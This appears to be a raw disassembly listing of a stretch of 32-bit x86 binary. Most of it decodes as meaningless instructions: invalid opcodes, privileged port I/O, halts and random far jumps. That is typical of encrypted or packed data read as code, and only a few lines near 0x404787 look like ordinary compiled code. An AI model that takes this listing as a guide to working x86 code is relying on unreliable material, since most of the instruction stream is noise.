  4041de:	mov    es,WORD PTR [esi+0x6c]
  4041e1:	mov    dl,0x50
  4041e3:	adc    dl,bh
  4041e5:	or     DWORD PTR [edi],ebx
  4041e7:	mov    bh,bl
  4041e9:	int    0x86
  4041eb:	shl    BYTE PTR [ebp+eiz*4-0x34],cl
  4041ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f0:	add    DWORD PTR [ecx+esi*8+0x54],ecx
  4041f4:	fcom   DWORD PTR [ebx]
  4041f6:	out    0x5d,al
  4041f8:	jl     0x404180
  4041fa:	adc    DWORD PTR [edi+ecx*8],ebx
  4041fd:	xchg   ebp,eax
  4041fe:	out    dx,al
  4041ff:	ror    DWORD PTR [ebx-0x7d2ef92e],cl
  404205:	(bad)  
  404206:	pop    ds
  404207:	add    BYTE PTR [edx],dh
  404209:	sub    ah,al
  40420b:	call   0xae1ce07e
  404210:	(bad)  
  404212:	sbb    BYTE PTR [eax-0x506a79c2],bh
  404218:	in     eax,0xfc
  40421a:	mov    bh,0x74
  40421c:	inc    ebp
  40421d:	xchg   esp,eax
  40421e:	(bad)  
  40421f:	cdq    
  404220:	mov    eax,0x7925636d
  404225:	shl    BYTE PTR [edx+esi*1],cl
  404228:	in     eax,dx
  404229:	adc    ch,BYTE PTR [ebx]
  40422b:	fwait
  40422c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40422d:	out    dx,al
  40422e:	or     dl,ch
  404230:	and    DWORD PTR [edx],ebx
  404232:	ret    
  404233:	test   DWORD PTR [edx],0x38a3e936
  404239:	xor    eax,0x4feefc04
  40423e:	in     al,0xac
  404240:	loope  0x404295
  404242:	in     eax,0x37
  404244:	pop    edx
  404245:	out    0x7a,al
  404247:	fs pop ebp
  404249:	hlt    
  40424a:	(bad)  
  40424b:	outs   dx,BYTE PTR ds:[esi]
  40424c:	mov    dl,0x54
  40424e:	repz (bad) 
  404250:	dec    ebx
  404251:	add    bh,BYTE PTR [ebp-0x1729e9f6]
  404257:	pop    ebp
  404258:	and    bh,BYTE PTR [esi-0x64200c59]
  40425e:	lock xor al,0x99
  404261:	and    al,0xe7
  404263:	or     DWORD PTR [edi-0x45e3a82e],esp
  404269:	jb     0x4042d6
  40426b:	cmp    BYTE PTR [ebx+0x264e15bf],0x53
  404272:	xor    eax,0x7862989a
  404277:	sbb    eax,ebx
  404279:	ins    DWORD PTR es:[edi],dx
  40427a:	into   
  40427b:	xchg   edi,eax
  40427c:	mov    WORD PTR es:[edx],ss
  40427f:	(bad)  
  404280:	sbb    BYTE PTR [ecx-0x12],bl
  404283:	push   ebp
  404284:	jle    0x40420c
  404286:	inc    edx
  404287:	test   ebp,0xca2e264d
  40428d:	dec    edi
  40428f:	mov    eax,0x5ccabafd
  404294:	push   ss
  404295:	xor    dl,BYTE PTR [eax-0x10]
  404298:	ror    BYTE PTR [eax],0x2b
  40429b:	fs push eax
  40429d:	aam    0x74
  40429f:	xor    DWORD PTR [edx-0x6c],ebp
  4042a2:	pop    es
  4042a3:	ja     0x4042fa
  4042a5:	push   ds
  4042a6:	rcl    DWORD PTR [eax+0x65],1
  4042a9:	lods   eax,DWORD PTR ds:[esi]
  4042aa:	sub    esp,esi
  4042ac:	jp     0x404272
  4042ae:	rol    edx,1
  4042b0:	push   ebx
  4042b1:	inc    DWORD PTR [edi+0x1c]
  4042b4:	add    BYTE PTR [esi],ch
  4042b6:	xor    cl,ch
  4042b8:	(bad)  
  4042b9:	sub    DWORD PTR [edx],ebp
  4042bb:	pop    edi
  4042bc:	mov    ch,0x64
  4042be:	inc    esi
  4042bf:	and    ch,ah
  4042c1:	jmp    0xd0a7:0x418a9a6f
  4042c8:	lods   al,BYTE PTR ds:[esi]
  4042c9:	dec    ecx
  4042ca:	push   edi
  4042cb:	mov    ecx,fs
  4042cd:	test   al,0x3f
  4042cf:	std    
  4042d0:	add    eax,0xae06454e
  4042d5:	mov    esp,0xab6d7487
  4042da:	mov    cl,BYTE PTR [bp+di]
  4042dd:	xor    eax,0x25255e0d
  4042e2:	ror    DWORD PTR [ebx],1
  4042e4:	call   0x63f0:0x30dd2c22
  4042eb:	in     eax,0x13
  4042ed:	retf   
  4042ee:	and    BYTE PTR [esi-0x44],dh
  4042f1:	xchg   ebp,eax
  4042f2:	dec    edi
  4042f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f4:	addr16 xor edx,0x5b
  4042f8:	stc    
  4042f9:	frstor [ebp+0x16]
  4042fc:	rcl    BYTE PTR [esi-0x42],1
  4042ff:	mov    esi,0x3df039e7
  404304:	jmp    0xd6aa:0x913c19cd
  40430b:	dec    ebp
  40430c:	mov    bl,0xd
  40430e:	cdq    
  40430f:	mov    al,0x22
  404311:	je     0x4042b6
  404313:	imul   ebx,esp,0xf9dd8a1d
  404319:	mov    dl,0x70
  40431b:	out    0x19,al
  40431d:	mov    ebp,0x219e84ec
  404322:	fwait
  404323:	in     al,dx
  404324:	outs   dx,BYTE PTR ds:[esi]
  404325:	(bad)  
  404326:	xor    DWORD PTR [ecx-0x27c89068],0xae4dc5ff
  404330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404331:	enter  0xc0dd,0xb
  404335:	out    dx,eax
  404336:	push   esi
  404337:	inc    ebx
  404338:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40433a:	adc    al,0x2d
  40433c:	(bad)  
  40433d:	push   ebx
  40433e:	call   0xe473:0xdce1d986
  404345:	adc    DWORD PTR [edx],0x5ad3452a
  40434b:	lahf   
  40434c:	jg     0x404390
  40434e:	jne    0x4043a4
  404350:	sbb    cl,cl
  404352:	or     al,0xe1
  404354:	xchg   ecx,eax
  404355:	sbb    BYTE PTR [esp+ebx*8+0x30],bl
  404359:	push   ebx
  40435a:	les    esi,FWORD PTR [edx]
  40435c:	cli    
  40435d:	add    esi,0x2e8eb3ba
  404363:	inc    ecx
  404364:	sub    DWORD PTR [ecx+0x72464534],ebp
  40436a:	pop    ebx
  40436b:	sub    cl,bl
  40436d:	mov    ds:0xe483383b,eax
  404372:	pop    esi
  404373:	loop   0x40431e
  404375:	xchg   esp,eax
  404376:	(bad)  
  404377:	and    esp,DWORD PTR [esi]
  404379:	lods   eax,DWORD PTR ds:[esi]
  40437a:	shl    DWORD PTR [edx],0x6a
  40437d:	xor    DWORD PTR [edx+esi*1-0x3],esi
  404381:	(bad)  
  404382:	xor    ebx,DWORD PTR [edi]
  404384:	sub    ecx,edx
  404386:	adc    al,0xbb
  404388:	std    
  404389:	sub    DWORD PTR [ebx+0x64],edx
  40438c:	loopne 0x404312
  40438e:	rcr    edi,1
  404390:	jge    0x404328
  404392:	(bad)  
  404393:	js     0x4043a5
  404395:	les    ebx,FWORD PTR [edi+0x79fccec9]
  40439b:	jp     0x40440d
  40439d:	cmp    BYTE PTR cs:[eax+0x7d],ah
  4043a1:	sub    eax,0xbe18130a
  4043a6:	xchg   esp,eax
  4043a7:	adc    al,BYTE PTR [ebp+edi*1+0x6]
  4043ab:	(bad)  
  4043ac:	hlt    
  4043ad:	jmp    0x404390
  4043af:	pop    ds
  4043b0:	mov    ch,0x23
  4043b2:	xchg   esi,eax
  4043b3:	ins    DWORD PTR es:[edi],dx
  4043b4:	and    eax,0xd07664e0
  4043b9:	mov    bh,0xd4
  4043bb:	lock and al,0xaa
  4043be:	inc    ecx
  4043bf:	pop    esp
  4043c0:	jmp    0x5166:0x3afd4d5c
  4043c7:	retf   
  4043c8:	rol    ebp,1
  4043ca:	jmp    0x40440a
  4043cc:	sub    ebx,edi
  4043ce:	dec    ecx
  4043cf:	aam    0x7f
  4043d1:	push   edi
  4043d2:	dec    esi
  4043d3:	inc    ebx
  4043d4:	idiv   BYTE PTR [edx+0x12]
  4043d7:	push   esp
  4043d8:	call   0x6e1d:0xceefdab7
  4043df:	lds    eax,FWORD PTR [eax-0x1c]
  4043e2:	jp     0x4043cb
  4043e4:	not    DWORD PTR [edx+0x62f39548]
  4043ea:	enter  0x69e0,0x3e
  4043ee:	retf   0x88ec
  4043f1:	xchg   edi,eax
  4043f2:	pop    ecx
  4043f3:	test   al,0xb9
  4043f5:	push   eax
  4043f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f7:	sub    bl,cl
  4043f9:	sub    eax,0x96cabf5a
  4043fe:	mov    esp,0xc0af61bc
  404403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404404:	or     DWORD PTR [edi+0x57],eax
  404407:	enter  0xd8f5,0xf5
  40440b:	aaa    
  40440c:	mov    edx,0x558e6d8c
  404411:	xor    DWORD PTR [esi-0x66],esi
  404414:	in     al,dx
  404415:	adc    DWORD PTR [edi+0x8],ebx
  404418:	mov    edx,0x61bf3934
  40441d:	test   edi,ebx
  40441f:	cmp    esi,DWORD PTR [ebx+ecx*8]
  404422:	mov    DWORD PTR [edi-0x1a],0x5e32c27d
  404429:	and    DWORD PTR ds:[eax],ecx
  40442c:	sub    al,BYTE PTR [ebx+eiz*1+0x6]
  404430:	dec    eax
  404431:	imul   ebx,DWORD PTR [edx-0x8],0xffffffb0
  404435:	test   eax,0xd828e57f
  40443a:	in     eax,dx
  40443b:	ss jmp 0xf128:0x5bf0d77f
  404443:	inc    ebp
  404444:	daa    
  404445:	in     al,0x66
  404447:	jb     0x40446c
  404449:	inc    edx
  40444a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40444b:	cmp    edx,edi
  40444d:	mov    ds:0x39d48a51,al
  404452:	lods   al,BYTE PTR ds:[esi]
  404453:	sbb    al,cl
  404455:	fnstenv [ecx+0x5d]
  404458:	ror    BYTE PTR [ebp-0x61abc374],1
  40445e:	cwde   
  40445f:	add    al,0x95
  404461:	pop    edi
  404462:	lods   eax,DWORD PTR ds:[esi]
  404463:	outs   dx,BYTE PTR ds:[esi]
  404464:	bound  ebp,QWORD PTR [ebx]
  404466:	ret    
  404467:	mov    dl,0xd8
  404469:	fcomp  QWORD PTR ds:[edi]
  40446c:	add    al,0x9d
  40446e:	xchg   ebp,eax
  40446f:	sahf   
  404470:	mov    ecx,0x310a3fdb
  404475:	mov    bh,0x27
  404477:	daa    
  404478:	xchg   edx,eax
  404479:	(bad)  
  40447a:	mov    al,BYTE PTR [edx+0x33]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404419
  404490:	push   ecx
  404491:	cmp    DWORD PTR [ebp+0x5e],esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404516
  40449c:	int    0x11
  40449e:	xor    edx,DWORD PTR ds:0x3ed8a1fc
  4044a4:	xor    BYTE PTR [esi],0x4b
  4044a7:	or     DWORD PTR [ebx+0x48],edx
  4044aa:	push   ebx
  4044ab:	stc    
  4044ac:	mov    edx,0xca8d3ee7
  4044b1:	jl     0x4044d3
  4044b3:	pop    edi
  4044b4:	mov    dl,0x62
  4044b6:	retf   
  4044b7:	or     DWORD PTR [ebx],edi
  4044b9:	push   ecx
  4044ba:	mov    al,ds:0xc2ec335e
  4044bf:	gs pop esi
  4044c1:	fs pop ebx
  4044c3:	sub    al,0x8a
  4044c5:	sub    eax,0x74689a59
  4044ca:	push   esi
  4044cb:	dec    edi
  4044cc:	mov    ah,0x49
  4044ce:	jle    0x404482
  4044d0:	add    al,0xd5
  4044d2:	dec    ebx
  4044d3:	push   edx
  4044d4:	push   eax
  4044d5:	inc    edx
  4044d6:	aaa    
  4044d7:	fcom   QWORD PTR [ebp-0x2fda5b62]
  4044dd:	loopne 0x404487
  4044df:	(bad)  
  4044e0:	sbb    bh,bh
  4044e2:	aas    
  4044e3:	scas   eax,DWORD PTR es:[edi]
  4044e4:	outs   dx,BYTE PTR ds:[esi]
  4044e5:	fsub   DWORD PTR [ebp+0x300e8fb4]
  4044eb:	add    edx,DWORD PTR [eax+0x1b6f7a4f]
  4044f1:	add    BYTE PTR [ebx],cl
  4044f3:	dec    ebp
  4044f4:	das    
  4044f5:	mov    esp,0x81e4168
  4044fa:	and    al,0x33
  4044fc:	jo     0x4044e3
  4044fe:	mov    eax,0x9429a0d2
  404503:	or     ch,BYTE PTR [eax+eax*4-0x75]
  404507:	mov    ds:0xd7df24,eax
  40450c:	xchg   DWORD PTR [ebx+edi*8],ecx
  40450f:	inc    esp
  404510:	aaa    
  404511:	loopne 0x4044ab
  404513:	jae    0x404496
  404515:	jne    0x4044f9
  404517:	pop    ds
  404518:	jnp    0x404597
  40451a:	add    edx,esp
  40451c:	jl     0x4044c9
  40451e:	vpmacsdqh xmm2,xmm3,xmm7,XMMWORD PTR [eax-0x7b9bb054]
  404528:	xor    al,0x79
  40452a:	fwait
  40452b:	gs (bad) 
  40452d:	and    bh,BYTE PTR [ebp+0x6a]
  404530:	int    0x3f
  404532:	imul   eax,DWORD PTR [ebx],0xc2802d33
  404538:	jnp    0x4044f3
  40453a:	inc    edx
  40453b:	dec    ebp
  40453c:	lahf   
  40453d:	or     cl,dl
  40453f:	das    
  404540:	(bad)  
  404541:	push   0x16
  404543:	(bad)  
  404544:	jecxz  0x40451c
  404546:	pop    es
  404547:	out    dx,al
  404548:	call   0x3398:0xaacff397
  40454f:	leave  
  404550:	jno    0x404588
  404552:	out    dx,al
  404553:	xchg   esi,eax
  404554:	inc    ebp
  404555:	sub    DWORD PTR [eax],edx
  404557:	xlat   BYTE PTR ds:[ebx]
  404558:	cmp    ch,BYTE PTR [edi+ebp*4+0x78]
  40455c:	adc    BYTE PTR [edx+edx*1+0x2d],al
  404560:	mov    bh,0xdd
  404562:	ins    BYTE PTR es:[edi],dx
  404563:	retf   
  404564:	fidiv  WORD PTR [edx+edx*4]
  404567:	sahf   
  404568:	jl     0x404547
  40456a:	adc    ebx,esi
  40456c:	xor    eax,0xfcdc450f
  404571:	cli    
  404572:	and    DWORD PTR [edi+0x9],ecx
  404575:	(bad)  
  404576:	jecxz  0x404573
  404578:	or     al,0x12
  40457a:	(bad)  
  40457b:	sbb    DWORD PTR [ebp+0x1e92c84c],ebx
  404581:	xlat   BYTE PTR ds:[ebx]
  404582:	sub    al,0x2c
  404584:	fist   WORD PTR [eax]
  404586:	call   0xe7a6:0xecc07776
  40458d:	cmp    eax,0x40198b6f
  404592:	sub    eax,0x9dd6a6e9
  404597:	aaa    
  404598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404599:	lds    ebx,FWORD PTR [edx]
  40459b:	dec    ebx
  40459c:	cld    
  40459d:	xor    ah,BYTE PTR [ecx-0x4e738390]
  4045a3:	data16 int3 
  4045a5:	inc    esi
  4045a6:	(bad)  
  4045a7:	std    
  4045a8:	adc    BYTE PTR [ecx-0x20],0x5a
  4045ac:	jmp    0xf7e940c5
  4045b1:	mov    bh,0x77
  4045b3:	pusha  
  4045b4:	add    BYTE PTR [esi+0x252e0856],bh
  4045ba:	rol    DWORD PTR [edi+eax*4-0x18109cb7],0xc7
  4045c2:	sbb    al,0xb2
  4045c4:	ds pusha 
  4045c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045c7:	and    ah,dh
  4045c9:	or     DWORD PTR [ecx-0x5ff74e04],edi
  4045cf:	sub    BYTE PTR [ebx-0x7a],bl
  4045d2:	fist   DWORD PTR [edx]
  4045d4:	jno    0x404651
  4045d6:	ins    BYTE PTR es:[edi],dx
  4045d7:	in     eax,0xb
  4045d9:	icebp  
  4045da:	pop    edx
  4045db:	jns    0x4045d6
  4045dd:	lock jne 0x4045af
  4045e0:	(bad)  
  4045e1:	shr    DWORD PTR [ebp-0x26],cl
  4045e4:	in     al,0xdc
  4045e6:	outs   dx,DWORD PTR ds:[esi]
  4045e7:	push   ebx
  4045e8:	into   
  4045e9:	add    ecx,DWORD PTR [ebx]
  4045eb:	inc    eax
  4045ec:	inc    ebp
  4045ed:	or     eax,0xfe656926
  4045f2:	aam    0x1d
  4045f4:	adc    bh,BYTE PTR [edi]
  4045f6:	push   es
  4045f7:	pop    es
  4045f8:	cld    
  4045f9:	jae    0x404623
  4045fb:	cs enter 0x1cfe,0xc9
  404600:	icebp  
  404601:	jecxz  0x40463f
  404603:	ins    BYTE PTR es:[edi],dx
  404604:	xchg   esp,eax
  404605:	daa    
  404606:	scas   al,BYTE PTR es:[edi]
  404607:	mov    bh,0xd0
  404609:	xchg   ebx,eax
  40460a:	ja     0x4045e0
  40460c:	(bad)  
  40460d:	imul   ecx,DWORD PTR [ebx],0x28
  404610:	dec    eax
  404611:	xor    eax,eax
  404613:	push   es
  404614:	rcl    DWORD PTR [esi+esi*4+0x52],cl
  404618:	xchg   DWORD PTR [edx-0x6],ebx
  40461b:	imul   edi,edi,0xffffffeb
  40461e:	mov    dh,0xd7
  404620:	ins    BYTE PTR es:[edi],dx
  404621:	sahf   
  404622:	pop    ebx
  404623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404624:	and    al,0xc1
  404626:	push   esi
  404627:	lods   eax,DWORD PTR ds:[esi]
  404628:	push   0x98c73852
  40462d:	mov    ah,0x8a
  40462f:	test   BYTE PTR [ebp+0x6c],ch
  404632:	sub    BYTE PTR [ebx+0x73638e0c],bl
  404638:	dec    edi
  404639:	jmp    0x4045d7
  40463b:	push   DWORD PTR [ecx-0x5866b698]
  404641:	std    
  404642:	jmp    0xa949fad5
  404647:	dec    eax
  404648:	lock push ecx
  40464a:	push   ebp
  40464b:	ins    DWORD PTR es:[edi],dx
  40464c:	jmp    0x6bc6fae8
  404651:	mov    edx,0x5d0b5f27
  404656:	or     BYTE PTR [ebx-0x2506984e],0xe1
  40465d:	stc    
  40465e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40465f:	fyl2x  
  404661:	hlt    
  404662:	seta   BYTE PTR [edx+0x4599a7b5]
  404669:	add    BYTE PTR [ecx],ch
  40466b:	xchg   ebx,eax
  40466c:	mov    bh,0x9e
  40466e:	ja     0x40466d
  404670:	mov    BYTE PTR [ecx+ebx*8],ah
  404673:	mov    al,0x22
  404675:	mov    eax,0x4f27e6c
  40467a:	test   eax,0x5ddb3766
  40467f:	(bad)  
  404680:	stos   DWORD PTR es:[edi],eax
  404681:	and    esi,edx
  404683:	ret    0xb903
  404686:	or     BYTE PTR [esp+ebp*8-0x608274c9],0x3e
  40468e:	inc    edx
  40468f:	dec    edx
  404690:	js     0x40470e
  404692:	push   edi
  404693:	out    0xd1,al
  404695:	adc    eax,ecx
  404697:	call   0xb8f5:0xe235e5ea
  40469e:	js     0x40469c
  4046a0:	ret    0xbf77
  4046a3:	jo     0x4046f9
  4046a5:	(bad)  [edx]
  4046a7:	inc    esi
  4046a8:	gs adc eax,0xba170698
  4046ae:	mov    ecx,0xf1e1b64a
  4046b3:	sbb    ebp,DWORD PTR [ebx]
  4046b5:	adc    eax,0x448dc5d3
  4046ba:	fcmovbe st,st(3)
  4046bc:	fild   WORD PTR [edi-0x11]
  4046bf:	cmp    eax,ecx
  4046c1:	fwait
  4046c2:	out    dx,al
  4046c3:	into   
  4046c4:	push   esp
  4046c5:	sub    edi,edx
  4046c7:	test   BYTE PTR [esi-0x29b39e62],0xe
  4046ce:	nop
  4046cf:	mov    ebp,0x674b44d0
  4046d4:	dec    edi
  4046d5:	mov    bh,0x6a
  4046d7:	add    al,0x37
  4046d9:	mov    esi,0x5ea0bad8
  4046de:	inc    edx
  4046df:	les    edi,FWORD PTR [esi+edi*8]
  4046e2:	or     cl,0x50
  4046e5:	xchg   esi,eax
  4046e6:	jge    0x40475e
  4046e8:	fild   WORD PTR [eax+0x31e42163]
  4046ee:	or     edi,DWORD PTR [ecx+0x56]
  4046f1:	sbb    dl,BYTE PTR [ebx]
  4046f3:	cmp    eax,0x82b1ee08
  4046f8:	add    al,0x2d
  4046fa:	mov    al,ds:0x1a5625e8
  4046ff:	xchg   esi,edi
  404701:	lods   al,BYTE PTR ds:[esi]
  404702:	mov    dh,0xc2
  404704:	(bad)  
  404705:	enter  0x3eec,0x7d
  404709:	cmp    al,al
  40470b:	or     BYTE PTR [edx-0x1c],bl
  40470e:	mov    edx,0x227f4297
  404713:	push   edx
  404714:	(bad)  
  404716:	add    al,0x11
  404718:	push   es
  404719:	add    DWORD PTR [ebp-0x37da1cac],esp
  40471f:	lods   al,BYTE PTR ds:[esi]
  404720:	mov    es,edi
  404722:	cmp    al,0x53
  404724:	dec    edx
  404725:	xchg   edi,eax
  404726:	lods   eax,DWORD PTR ds:[esi]
  404727:	push   ebx
  404728:	pop    ebx
  404729:	rcl    BYTE PTR [ebp+0x2ef3d5ab],0xfb
  404730:	push   esp
  404731:	into   
  404732:	(bad)  
  404733:	idiv   DWORD PTR ds:0x6e2995a4
  404739:	retf   
  40473a:	mov    al,0x7a
  40473c:	sub    al,0x85
  40473e:	cmp    DWORD PTR [eax-0x31eb6e8],ecx
  404744:	mov    gs,ebp
  404746:	sbb    ebp,DWORD PTR [ebx-0x6b7f7ead]
  40474c:	push   0x4d
  40474e:	sbb    ah,BYTE PTR [edi-0x53]
  404751:	sub    dl,0x85
  404754:	lods   al,BYTE PTR ds:[esi]
  404755:	popa   
  404756:	sahf   
  404757:	fwait
  404758:	mov    eax,ds:0xb5aa2e1
  40475d:	loopne 0x4047ad
  40475f:	mov    edx,0xd5768e7
  404764:	and    BYTE PTR [edi+0x12eadf62],ah
  40476a:	mov    esp,DWORD PTR [edi]
  40476c:	popf   
  40476d:	adc    dh,BYTE PTR [ecx-0x1b71ddad]
  404773:	mov    edx,0x1adb263d
  404778:	lock add al,0x2c
  40477b:	mov    eax,ds:0x37ab5036
  404780:	mov    al,0x33
  404782:	rol    BYTE PTR [ebx],1
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	mov    ch,dh
  4047b6:	out    dx,eax
  4047b7:	mov    eax,0x7e7e27b8
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404813
  4047c1:	sub    ecx,DWORD PTR [edx+0x48217654]
  4047c7:	int3   
  4047c8:	pop    edx
  4047c9:	cwde   
  4047ca:	mov    eax,0x687ee1af
  4047cf:	pop    ds
  4047d0:	jle    0x4047c9
  4047d2:	fnstenv [ecx-0x4c1a5a8a]
  4047d8:	les    ecx,FWORD PTR [ebx-0x78a8b671]
  4047de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047df:	(bad)  
  4047e0:	enter  0x9c5d,0x72
  4047e4:	cwde   
  4047e5:	fld    QWORD PTR [edi+0x79]
  4047e8:	in     al,0xd0
  4047ea:	mov    ecx,0xd203861
  4047ef:	retf   
  4047f0:	pop    ebx
  4047f1:	ds repz repnz pop ecx
  4047f5:	inc    esp
  4047f6:	mov    bh,0x60
  4047f8:	jno    0x4047b8
  4047fa:	jl     0x404837
  4047fc:	sub    DWORD PTR [edx-0x9],0x20c623e0
  404803:	inc    edx
  404804:	repnz (bad) 
  404806:	and    DWORD PTR [ebx],ebx
  404808:	in     al,0x53
  40480a:	int    0xa6
  40480c:	icebp  
  40480d:	mov    ebx,0x43aee62a
  404812:	jp     0x404881
  404814:	scas   al,BYTE PTR es:[edi]
  404815:	fild   WORD PTR [ecx-0x50]
  404818:	mov    bh,cl
  40481a:	pop    edx
  40481b:	xchg   ebp,eax
  40481c:	and    dh,bh
  40481e:	pushf  
  40481f:	int3   
  404820:	dec    esp
  404821:	push   esi
  404822:	aam    0x9e
  404824:	dec    edi
  404825:	sbb    al,0x3
  404827:	(bad)  
  404828:	frstor [ecx+0x1b]
  40482b:	inc    esp
  40482c:	push   ds
  40482d:	test   DWORD PTR [edi],0x92ac6239
  404833:	pop    ecx
  404834:	push   ds
  404835:	imul   ecx,DWORD PTR [esi],0xffffffb6
  404838:	lock sbb BYTE PTR [edi-0x50],dl
  40483c:	xchg   ebx,eax
  40483d:	sbb    edi,DWORD PTR [eax+0x168ec84d]
  404843:	inc    edi
  404844:	test   DWORD PTR [edi-0x13],ebx
  404847:	cld    
  404848:	cmp    DWORD PTR [esi],ebp
  40484a:	push   0x55ea6334
  40484f:	push   0xffffff8c
  404851:	inc    edx
  404852:	out    0x55,al
  404854:	push   ebx
  404855:	and    eax,0xfa28f7e0
  40485a:	dec    eax
  40485b:	push   ecx
  40485c:	mov    esp,0x1ceee654
  404861:	sbb    dl,cl
  404863:	(bad)  
  404864:	xlat   BYTE PTR ds:[ebx]
  404865:	hlt    
  404866:	xor    eax,0xd99ba617
  40486b:	jb     0x4048e9
  40486d:	aam    0xba
  40486f:	xor    ecx,0x2851763c
  404875:	adc    dl,BYTE PTR [esi+eax*4-0x5d5f0ee]
  40487c:	test   BYTE PTR [edi+0x57],ah
  40487f:	jae    0x40485a
  404881:	push   0xffffffa0
  404883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404884:	mov    eax,0xda1aac20
  404889:	and    bh,BYTE PTR [ecx]
  40488b:	clc    
  40488c:	xor    al,0xcb
  40488e:	xor    ah,cl
  404890:	aam    0x7e
  404892:	mov    eax,ds:0x5c0f2f1d
  404897:	or     eax,0xd0764e05
  40489c:	xor    esi,ebx
  40489e:	outs   dx,BYTE PTR ds:[esi]
  40489f:	mov    edx,0x909da31b
  4048a4:	fisubr WORD PTR [ebp+0x25]
  4048a7:	outs   dx,BYTE PTR ds:[esi]
  4048a8:	inc    ecx
  4048a9:	push   ebp
  4048aa:	leave  
  4048ab:	xchg   esp,eax
  4048ac:	cmc    
  4048ad:	in     eax,dx
  4048ae:	adc    bh,bh
  4048b0:	adc    al,0x6a
  4048b2:	sbb    eax,0x840ea8e9
  4048b7:	ret    0x2ba6
  4048ba:	dec    esi
  4048bb:	(bad)  
  4048bd:	pop    ebp
  4048be:	or     dl,BYTE PTR [ecx]
  4048c0:	es mov ah,0x60
  4048c3:	push   cs
  4048c4:	xchg   ebp,eax
  4048c5:	out    dx,al
  4048c6:	out    0x6a,al
  4048c8:	push   ecx
  4048c9:	imul   edi,DWORD PTR [edx-0x1e394bca],0x45afc15c
  4048d3:	or     BYTE PTR [eax+0x5d],bh
  4048d6:	or     eax,0x56b42f30
  4048db:	retf   
  4048dc:	stc    
  4048dd:	mov    BYTE PTR [ecx+0x7bc3203c],cl
  4048e3:	adc    BYTE PTR [edi+0x6f],cl
  4048e6:	call   0xfc33:0x22e8d74b
  4048ed:	dec    edi
  4048ee:	ins    BYTE PTR es:[edi],dx
  4048ef:	mov    edi,0xd0815761
  4048f4:	sub    esi,DWORD PTR [edi+0x5c79517]
  4048fa:	test   eax,0x561d879f
  4048ff:	sbb    eax,0xaa45bfd6
  404904:	es jbe 0x4048c7
  404907:	or     bh,bh
  404909:	out    0x95,al
  40490b:	std    
  40490c:	add    esp,0xff371581
  404912:	mov    eax,0xbb117737
  404917:	jge    0x4048fb
  404919:	dec    ebx
  40491a:	mov    dh,0x9
  40491c:	enter  0x1648,0x6b
  404920:	jne    0x404944
  404922:	add    edi,DWORD PTR [ecx]
  404924:	aad    0x50
  404926:	pop    ecx
  404927:	add    eax,0xf7d9f903
  40492c:	push   ebx
  40492d:	xchg   ebx,eax
  40492e:	adc    ah,BYTE PTR [edi-0x61]
  404931:	push   edi
  404932:	pop    ebp
  404933:	pop    ecx
  404934:	sbb    DWORD PTR [ebx+0x4439bf35],ebx
  40493a:	adc    ah,BYTE PTR [edi]
  40493c:	sbb    eax,0xc6ac0b90
  404941:	adc    DWORD PTR [ebx+0x35c645e3],ebx
  404947:	out    dx,al
  404948:	dec    ebx
  404949:	pop    edi
  40494a:	jp     0x404977
  40494c:	xor    BYTE PTR [ecx-0x20],ch
  40494f:	dec    esi
  404950:	cmp    DWORD PTR [ebp+0x64],0x19
  404954:	lods   al,BYTE PTR es:[esi]
  404956:	dec    esp
  404957:	mov    edi,0x974e2ed3
  40495c:	repz or al,0x78
  40495f:	jmp    FWORD PTR [esi+0x41201022]
  404965:	jmp    0x62114755
  40496a:	sub    al,0x57
  40496c:	outs   dx,BYTE PTR ds:[esi]
  40496d:	mov    edx,0x84b5920b
  404972:	lods   al,BYTE PTR ds:[esi]
  404973:	mov    esp,0xeda3a5f8
  404978:	ins    DWORD PTR es:[edi],dx
  404979:	in     al,0x79
  40497b:	cli    
  40497c:	cs mov dh,0xbf
  40497f:	stc    
  404980:	lods   eax,DWORD PTR ds:[esi]
  404981:	popa   
  404982:	lahf   
  404983:	(bad)
  404986:	xor    al,0x66
  404988:	sbb    BYTE PTR [ecx+edi*1-0x169a245d],0x13
  404990:	and    al,0x6c
  404992:	dec    DWORD PTR [ebx]
  404994:	mov    bh,dh
  404996:	pop    esi
  404997:	ret    0x4540
  40499a:	enter  0x6244,0xad
  40499e:	cli    
  40499f:	pop    esi
  4049a0:	and    edi,DWORD PTR [ecx-0x24a1b69d]
  4049a6:	xor    edx,edi
  4049a8:	fadd   st(2),st
  4049aa:	push   0xeede9fc1
  4049af:	pop    es
  4049b0:	shl    DWORD PTR [esp+ebx*4-0x25],0xff
  4049b5:	mov    dh,0x32
